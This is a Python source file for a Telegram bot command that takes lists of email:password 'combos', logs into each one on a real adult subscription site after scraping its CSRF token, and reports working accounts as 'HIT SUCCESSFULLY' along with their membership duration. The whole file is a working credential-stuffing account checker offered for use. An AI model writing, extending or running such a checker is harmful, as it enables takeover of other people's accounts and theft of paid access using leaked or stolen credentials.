import requests
import time

def process_sis_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ BRATTY SIS ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_sis_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /sis email:password")

def check_sis_account(account):
    email, password = account.split(':')
    session = requests.Session()

    # Get CSRF token
    response = session.get("https://brattysis.com/authentication/login")
    token = get_str(response.text, "name=\"csrf-token\" value=\"", "\"")

    # Attempt login
    login_data = {
        "username": email,
        "password": password,
        "sign-in": "",
        "r": "members.brattysis.com",
        "csrf-token": token
    }
    login_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    response = session.post("https://brattysis.com/authentication/login", data=login_data, headers=login_headers)

    if "The username or password you've entered is incorrect or blocked." in response.text:
        return "Incorrect Email OR Password❌"

    # Check account details
    account_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = session.get("https://members.brattysis.com/account", headers=account_headers)

    if "<title>Bratty Sis - Account Settings</title>" in response.text:
        membership_duration = get_str(response.text, "<label for=\"staticEmail\" class=\"col-sm-2 col-form-label\">Membership Duration</label>", "Days\">").strip()
        return f"HIT SUCCESSFULLY\nMembership Duration: {membership_duration} Days"
    
    return "Login failed or account not active❌"

def get_str(string, start, end):
    try:
        str_ = string.split(start)
        str_ = str_[1].split(end)
        return str_[0]
    except IndexError:
        return ""

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
